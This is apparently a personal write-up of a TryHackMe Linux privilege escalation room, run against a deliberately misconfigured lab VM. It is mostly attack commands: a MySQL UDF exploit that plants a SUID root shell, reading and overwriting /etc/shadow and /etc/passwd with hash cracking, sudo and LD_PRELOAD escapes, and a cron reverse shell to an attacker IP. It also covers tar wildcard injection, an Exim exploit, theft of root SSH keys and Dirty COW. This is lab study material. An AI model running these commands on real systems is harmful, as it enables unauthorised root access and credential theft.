# Linux PrivEsc – TryHackMe Writeup

## Objective
Practice multiple Linux privilege escalation techniques on an intentionally misconfigured Debian VM and obtain root access using different methods.

---

# Initial Access

## Check if host is alive
```bash
ping -c 5 <target-ip>
```

## SSH Login
```bash
ssh user@<target-ip>
# password: password321
```

Confirm low privileges:
```bash
id
```

---

# Service Exploits

## MySQL Running as Root (No Password)

### Enumeration
```bash
ps aux | grep mysql
mysql -u root
```

Version vulnerable → MySQL UDF exploitation.

### Compile exploit
```bash
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

### Load UDF in MySQL
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

### Root shell
```bash
/tmp/rootbash -p
```

---

# Weak File Permissions

## Readable /etc/shadow
```bash
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
su root
```

---

## Writable /etc/shadow
```bash
mkpasswd -m sha-512 newpassword
nano /etc/shadow
su root
```

---

## Writable /etc/passwd
```bash
openssl passwd newpassword
nano /etc/passwd
su root
```

---

# Sudo Misconfigurations

## Allowed binaries
```bash
sudo -l
```

### Example: iftop escape
```bash
sudo iftop
!
/bin/bash
```

---

## LD_PRELOAD
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so <program>
```

---

## LD_LIBRARY_PATH
```bash
gcc -shared -fPIC library_path.c -o /tmp/libcrypt.so.1
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

# Cron Job Exploits

## Writable script
```bash
nano /usr/local/bin/overwrite.sh
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

Listener:
```bash
nc -lvnp 4444
```

---

## PATH Hijack
```bash
echo "/bin/bash" > overwrite.sh
chmod +x overwrite.sh
/tmp/rootbash -p
```

---

## Wildcard Injection (tar)
```bash
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=shell.elf
```

---

# SUID / SGID Exploits

## Find SUID files
```bash
find / -type f -perm -u+s 2>/dev/null
```

---

## Exim exploit
```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

---

## Shared Object Injection
```bash
gcc -shared -fPIC -o ~/.config/libcalc.so libcalc.c
/usr/local/bin/suid-so
```

---

## PATH Hijack (service)
```bash
gcc -o service service.c
PATH=.:$PATH /usr/local/bin/suid-env
```

---

## Bash Function Abuse
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

---

# Credentials & Keys

## History files
```bash
cat ~/.*history
```

---

## Config files
```bash
cat /etc/openvpn/auth.txt
```

---

## SSH keys
```bash
cat /.ssh/root_key
ssh -i root_key root@<target-ip>
```

---

# NFS Misconfiguration

Root squashing disabled.

```bash
mount -o rw,vers=3 <target-ip>:/tmp /tmp/nfs
chmod +xs shell.elf
/tmp/shell.elf
```

---

# Kernel Exploit

Linux Exploit Suggester:
```bash
perl linux-exploit-suggester-2.pl
```

Dirty COW:
```bash
gcc -pthread c0w.c -o c0w
./c0w
```

---

# PrivEsc Scripts

```bash
./LinEnum.sh
./linpeas.sh
./lse.sh
```

---

# Techniques Practiced

- MySQL UDF exploitation  
- Weak file permissions  
- Sudo misconfigurations  
- Cron job abuse  
- SUID/SGID exploitation  
- PATH hijacking  
- SSH key leaks  
- NFS misconfig  
- Kernel exploits  
- Enumeration scripts  

---

✅ Room completed successfully
